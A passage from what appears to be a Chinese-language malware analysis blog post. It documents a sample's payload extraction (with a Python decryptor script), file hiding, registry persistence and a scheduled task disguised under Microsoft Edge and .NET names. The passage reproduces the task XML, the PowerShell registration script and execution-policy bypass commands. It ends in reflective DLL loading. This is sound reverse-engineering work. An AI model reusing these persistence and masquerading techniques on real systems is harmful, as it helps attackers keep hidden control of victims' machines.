F8 CE D7 C4 89 C3 C6 D3 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7&quot;</span>)</span><br><span class="line">RAW_86A8 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;93 B9 B3 C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 AE B0&quot;</span>)</span><br><span class="line">RAW_8648 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;EB EC E7 D1 CE D2 D4 C4 D3 D5 CE D1 CE C6 CB 89 D4 DE D4 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7&quot;</span>)</span><br><span class="line"></span><br><span class="line">NAMES = [</span><br><span class="line">    <span class="string">&quot;drop_random_name.exe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;npwzwmc64.dll&quot;</span>,</span><br><span class="line">    <span class="string">&quot;space.ico&quot;</span>,</span><br><span class="line">    <span class="string">&quot;vdi_ipc.dat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ranchserv.jpg&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32le</span>(<span class="params">buf: <span class="built_in">bytes</span>, off: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, buf, off)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_tag</span>(<span class="params">raw: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ <span class="number">0x68</span> <span class="keyword">for</span> x <span class="keyword">in</span> raw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pe_timestamp</span>(<span class="params">pe: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    e_lfanew = u32le(pe, <span class="number">0x3C</span>)</span><br><span class="line">    <span class="keyword">return</span> u32le(pe, e_lfanew + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_u32_repeating</span>(<span class="params">data: <span class="built_in">bytes</span>, key_u32: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    k = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, key_u32)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b ^ k[i % <span class="number">4</span>] <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">between</span>(<span class="params">haystack: <span class="built_in">bytes</span>, start: <span class="built_in">bytes</span>, end: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    s = haystack.find(start)</span><br><span class="line">    <span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;start tag not found&quot;</span>)</span><br><span class="line">    s += <span class="built_in">len</span>(start)</span><br><span class="line">    e = haystack.find(end, s)</span><br><span class="line">    <span class="keyword">if</span> e &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;end tag not found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> haystack[s:e]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rolling_transform_sub_1800195F0</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    out = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    state = ROLLING_KEY</span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(out):</span><br><span class="line">        out[i] = b ^ ((state &gt;&gt; (<span class="number">8</span> * (i % <span class="number">4</span>))) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        state = ((state &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFF</span>) | b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_hex</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(data).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    sample = INPUT_PATH.read_bytes()</span><br><span class="line">    ts = pe_timestamp(sample)</span><br><span class="line"></span><br><span class="line">    marker = sample.find(MARKER)</span><br><span class="line">    <span class="keyword">if</span> marker &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;QEMB8WGP not found&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload_len = u32le(sample, marker + <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> payload_len == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;QEMB payload length is zero in this sample&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = sample[marker + <span class="number">12</span> : marker + <span class="number">12</span> + payload_len]</span><br><span class="line">    payload = xor_u32_repeating(payload, ts)</span><br><span class="line"></span><br><span class="line">    tag_pairs = [</span><br><span class="line">        (decode_tag(RAW_85E8), decode_tag(RAW_8678)),</span><br><span class="line">        (decode_tag(RAW_8600), decode_tag(RAW_8618)),</span><br><span class="line">        (decode_tag(RAW_8660), decode_tag(RAW_8630)),</span><br><span class="line">        (decode_tag(RAW_85D0), decode_tag(RAW_8690)),</span><br><span class="line">        (decode_tag(RAW_86A8), decode_tag(RAW_8648)),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    chunks = [between(payload, s, e) <span class="keyword">for</span> s, e <span class="keyword">in</span> tag_pairs]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Malware writes random bytes at these positions; use fixed zeros for stable output.</span></span><br><span class="line">    chunks[<span class="number">0</span>] = chunks[<span class="number">0</span>][:-<span class="number">1</span>] + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    chunks[<span class="number">1</span>] = chunks[<span class="number">1</span>][:-<span class="number">4</span>] + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line">    chunks[<span class="number">2</span>] = chunks[<span class="number">2</span>][:<span class="number">0x0F</span>] + <span class="string">b&quot;\x00&quot;</span> + chunks[<span class="number">2</span>][<span class="number">0x10</span>:]</span><br><span class="line">    chunks[<span class="number">3</span>] = chunks[<span class="number">3</span>][:<span class="number">0x0F</span>] + <span class="string">b&quot;\x00&quot;</span> + chunks[<span class="number">3</span>][<span class="number">0x10</span>:]</span><br><span class="line">    chunks[<span class="number">4</span>] = chunks[<span class="number">4</span>][:-<span class="number">4</span>] + <span class="string">b&quot;\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    OUTPUT_DIR.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] input=<span class="subst">&#123;INPUT_PATH&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] marker=0x<span class="subst">&#123;marker:X&#125;</span> payload_len=0x<span class="subst">&#123;payload_len:X&#125;</span> ts=0x<span class="subst">&#123;ts:08X&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name, chunk <span class="keyword">in</span> <span class="built_in">zip</span>(NAMES, chunks):</span><br><span class="line">        recovered = rolling_transform_sub_1800195F0(chunk)</span><br><span class="line">        out_path = OUTPUT_DIR / name</span><br><span class="line">        out_path.write_bytes(recovered)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span>: size=<span class="subst">&#123;<span class="built_in">len</span>(recovered)&#125;</span> sha256=<span class="subst">&#123;sha256_hex(recovered)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] done: <span class="subst">&#123;OUTPUT_DIR&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python extract_and_decrypt_dropped_files_stage3.py</span><br><span class="line">[+] input=sample_ioc.exe</span><br><span class="line">[+] marker=0x3AE2200 payload_len=0x9B0423 ts=0xFA9EBC09</span><br><span class="line">[+] drop_random_name.exe: size=113312 sha256=f69b7f2237fe8f94cea12d78388b86fca6766811f4aa9157aa231c4feec5dff8</span><br><span class="line">[+] npwzwmc64.dll: size=3625472 sha256=aac33f3c3a2e2e0640eba8858376403e2d561ab44d0da395f5347f483ca1b001</span><br><span class="line">[+] space.ico: size=8398 sha256=40b40654d07ba79249152544313b48b6a7db47eb367caa2122346a3061b31efb</span><br><span class="line">[+] vdi_ipc.dat: size=6383445 sha256=9e1eb35d31aca13fa369a1b0b7ce162e58855217d98cb3e9bd2931fbe6e41d83</span><br><span class="line">[+] ranchserv.jpg: size=28272 sha256=cbb491135d4b7d5a0aa8614a6afc58c8ed23e5688b3bc63bdf0ca3d964fc99d0</span><br><span class="line">[+] done: stage3_drop_files</span><br></pre></td></tr></table></figure>

<p>调用 <code>SetFileAttributesA</code> 并使用位运算来修改文件属性，从而实现文件的隐藏。</p>
<p><code>dwFileAttributes != -1</code>检查文件是否存在或是否有权限访问（<code>-1</code> 代表 <code>INVALID_FILE_ATTRIBUTES</code>）。</p>
<p>数字6是两个属性常量的按位或结果：</p>
<ul>
<li>FILE_ATTRIBUTE_HIDDEN (0x2) : 值为 2 ，表示隐藏属性。</li>
<li>FILE_ATTRIBUTE_SYSTEM (0x4) : 值为 4 ，表示系统属性。</li>
</ul>
<p><img src="/image/2026-02-12-malware_analysis_2/1771336865152.png" alt="1771336865152"></p>
<p>文件全部落地后会读取文件, 在自身的文件内存中搜索 <code>%&amp;$6@=*</code>，在其前方添加32字节的随机数据后写入到 <code>HKLM\SOFTWARE\JDBCC\data</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">persist_hklm_software_jdbcc_data</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    self = read_current_module();</span><br><span class="line">    mark = find_bytes(self, <span class="string">&quot;%&amp;$6@=*&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!mark) ExitProcess(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    rnd32 = rand_alpha_bytes(<span class="number">32</span>);</span><br><span class="line">    data72 = rnd32 || mark[<span class="number">0</span>:<span class="number">40</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!open_or_create(HKLM, <span class="string">&quot;SOFTWARE\\JDBCC&quot;</span>, &amp;hKey)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ok = !RegSetValueExA(hKey, <span class="string">&quot;data&quot;</span>, REG_BINARY, data72, <span class="number">0x48</span>);</span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-12-malware_analysis_2/1771495252218.png" alt="1771495252218"></p>
<h5 id="运行与持久化"><a href="#运行与持久化" class="headerlink" title="运行与持久化"></a>运行与持久化</h5><h6 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h6><p>对于win8以上的系统：</p>
<p><code>setup_edgeupdate_task_script_and_persistence</code> 创建的计划任务名称为”MicrosoftEdgeUpdateTaskUA Task-S-1-5-18  &lt;随机5字符&gt;”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setup_edgeupdate_task_script_and_persistence</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> rand5[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    random_charset_azAZ0(rand5, <span class="number">5</span>); </span><br><span class="line">    <span class="type">char</span> edge_like_name[<span class="number">256</span>] = <span class="string">&quot;MicrosoftEdgeUpdateTaskUA Task-S-1-5-18&quot;</span>;</span><br><span class="line">    strcat_s(edge_like_name, rand5);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *full_path = strdup_heap((<span class="type">char</span> *)(ctx + <span class="number">279</span>));</span><br><span class="line">    <span class="keyword">if</span> (!full_path) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *workdir = strdup_heap(full_path);</span><br><span class="line">    <span class="keyword">if</span> (!workdir) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *last_bs = <span class="built_in">strrchr</span>(workdir, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (last_bs) last_bs[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    install_schtask_via_powershell(<span class="literal">NULL</span>, edge_like_name, full_path, workdir);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <code>install_schtask_via_powershell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">install_schtask_via_powershell</span><span class="params">(unused, task_name_like_edge, exe_full, exe_dir)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!wsearchenv_s(task_name_like_edge, exe_full, exe_dir, &amp;xml_path_obj)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_register_schtask_ps1(xml_path_obj, <span class="string">L&quot;.NET Framework NGEN Converter&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ps1 = %APPDATA% + <span class="string">&quot;\\updated.ps1&quot;</span>; <span class="comment">// sub_180024170 + 拼接</span></span><br><span class="line">    <span class="keyword">if</span> (!run_powershell_setpolicy_and_run_ps1(ps1)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>wsearchenv_s</code>创建的xml模板如下：</p>
<ul>
<li>：由 GetUserNameA 获取当前用户名后拼接得到</li>
<li>：落地 EXE 全路径（上层传入的 full_path）</li>
<li>：该 EXE 所在目录（上层传入的 dir_path）</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Task</span> <span class="attr">version</span>=<span class="string">&quot;1.4&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RegistrationInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Author</span>&gt;</span>Microsoft Corporation<span class="tag">&lt;/<span class="name">Author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Description</span>&gt;</span>Auto-created scheduled task<span class="tag">&lt;/<span class="name">Description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">RegistrationInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Triggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LogonTrigger</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Enabled</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LogonTrigger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RegistrationTrigger</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Enabled</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RegistrationTrigger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TimeTrigger</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Repetition</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Interval</span>&gt;</span>PT1M<span class="tag">&lt;/<span class="name">Interval</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">StopAtDurationEnd</span>&gt;</span>false<span class="tag">&lt;/<span class="name">StopAtDurationEnd</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Repetition</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">StartBoundary</span>&gt;</span>2009-04-23T00:00:00<span class="tag">&lt;/<span class="name">StartBoundary</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Enabled</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TimeTrigger</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Triggers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Principals</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Principal</span> <span class="attr">id</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">UserId</span>&gt;</span>&#123;&#123;USER_ID&#125;&#125;<span class="tag">&lt;/<span class="name">UserId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">LogonType</span>&gt;</span>InteractiveToken<span class="tag">&lt;/<span class="name">LogonType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RunLevel</span>&gt;</span>HighestAvailable<span class="tag">&lt;/<span class="name">RunLevel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Principal</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Principals</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">MultipleInstancesPolicy</span>&gt;</span>IgnoreNew<span class="tag">&lt;/<span class="name">MultipleInstancesPolicy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DisallowStartIfOnBatteries</span>&gt;</span>false<span class="tag">&lt;/<span class="name">DisallowStartIfOnBatteries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StopIfGoingOnBatteries</span>&gt;</span>false<span class="tag">&lt;/<span class="name">StopIfGoingOnBatteries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AllowHardTerminate</span>&gt;</span>false<span class="tag">&lt;/<span class="name">AllowHardTerminate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StartWhenAvailable</span>&gt;</span>true<span class="tag">&lt;/<span class="name">StartWhenAvailable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RunOnlyIfNetworkAvailable</span>&gt;</span>false<span class="tag">&lt;/<span class="name">RunOnlyIfNetworkAvailable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">IdleSettings</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">StopOnIdleEnd</span>&gt;</span>false<span class="tag">&lt;/<span class="name">StopOnIdleEnd</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RestartOnIdle</span>&gt;</span>false<span class="tag">&lt;/<span class="name">RestartOnIdle</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">IdleSettings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AllowStartOnDemand</span>&gt;</span>true<span class="tag">&lt;/<span class="name">AllowStartOnDemand</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Enabled</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Hidden</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RunOnlyIfIdle</span>&gt;</span>false<span class="tag">&lt;/<span class="name">RunOnlyIfIdle</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">WakeToRun</span>&gt;</span>true<span class="tag">&lt;/<span class="name">WakeToRun</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExecutionTimeLimit</span>&gt;</span>PT0S<span class="tag">&lt;/<span class="name">ExecutionTimeLimit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Settings</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Actions</span> <span class="attr">Context</span>=<span class="string">&quot;Author&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Exec</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Command</span>&gt;</span>&#123;&#123;COMMAND&#125;&#125;<span class="tag">&lt;/<span class="name">Command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">WorkingDirectory</span>&gt;</span>&#123;&#123;WORKDIR&#125;&#125;<span class="tag">&lt;/<span class="name">WorkingDirectory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Exec</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Actions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://file+.vscode-resource.vscode-cdn.net/c%3A/1/Desktop/%E7%AC%94%E8%AE%B0/MyBlog/my-blog/source/_posts/image/2026-02-12-malware_analysis_2/1771388412805.png" alt="1771388412805"></p>
<p>创建一个内容如下的PowerShell脚本文件到临时路径。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xmlPath</span> = <span class="string">&quot;&lt;%APPDATA%\\PolicyManagement.xml&gt;&quot;</span></span><br><span class="line"><span class="variable">$taskName</span> = <span class="string">&quot;.NET Framework NGEN Converter&quot;</span></span><br><span class="line"><span class="variable">$xmlContent</span> = <span class="built_in">Get-Content</span> <span class="literal">-Path</span> <span class="variable">$xmlPath</span> | <span class="built_in">Out-String</span></span><br><span class="line"><span class="variable">$taskPath</span> = <span class="string">&quot;\\Microsoft\\Windows\\AppID\\&quot;</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-TaskPath</span> <span class="variable">$taskPath</span> <span class="literal">-Xml</span> <span class="variable">$xmlContent</span> <span class="literal">-TaskName</span> <span class="variable">$taskName</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-12-malware_analysis_2/1771337787124.png" alt="1771337787124"></p>
<p>然后通过如下的PowerShell命令行, 首先修改PowerShell策略为无限制, 然后执行对应的PowerShell脚本文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-Command</span> <span class="string">&quot;Set-ExecutionPolicy Unrestricted -Scope CurrentUser&quot;</span></span><br><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> <span class="string">&quot;&lt;%APPDATA%\\updated.ps1&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-12-malware_analysis_2/1771337862645.png" alt="1771337862645"></p>
<ol>
<li>脚本注册路径：</li>
</ol>
<ul>
<li>XML 文件：<code>%APPDATA%\\PolicyManagement.xml</code></li>
<li>PS1 文件：<code>%APPDATA%\\updated.ps1</code></li>
</ul>
<ol start="2">
<li>注册命令：</li>
</ol>
<ul>
<li><code>Register-ScheduledTask -TaskPath &quot;\\Microsoft\\Windows\\AppID\\&quot; -TaskName &quot;.NET Framework NGEN Converter&quot; -Xml &lt;xml&gt; -Force</code></li>
</ul>
<p>当系统版本低于win8时:</p>
<p>调用 <code>run_embedded_task_payload_variant_a</code>在内存中反射加载一个DLL, 通过该DLL的导出函数VirtuOne通过RPC来创建计划任务。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">run_embedded_task_payload_variant_a</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    mem = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x123AB</span>, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, blob_A@<span class="number">0x180093020</span>, <span class="number">0x123AB</span>);</span><br><span class="line">    <span class="keyword">if</span> (!VirtualProtect(mem, <span class="number">0x123AB</span>, PAGE_EXECUTE_READWRITE, &amp;old)) &#123;</span><br><span class="line">        VirtualFree(mem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pVirtuOne= ((<span class="type">entry_t</span>)mem)(...); <span class="comment">// 返回函数指针</span></span><br><span class="line"></span><br><span class="line">    rand5 = random_charset_azAZ0(<span class="number">5</span>);</span><br><span class="line">    task_name = <span class="string">L&quot;MicrosoftEdgeUpdateTaskUA Task-S-1-5-18 &quot;</span> + rand5;</span><br><span class="line">    exe_full_w = ansi_to_wide((<span class="type">char</span> *)(ctx + <span class="number">279</span>)); <span class="comment">// sub_18003FE10</span></span><br><span class="line">    workdir_w  = ansi_to_wide((<span class="type">char</span> *)(ctx + <span class="number">279</span>));</span><br><span class="line"> 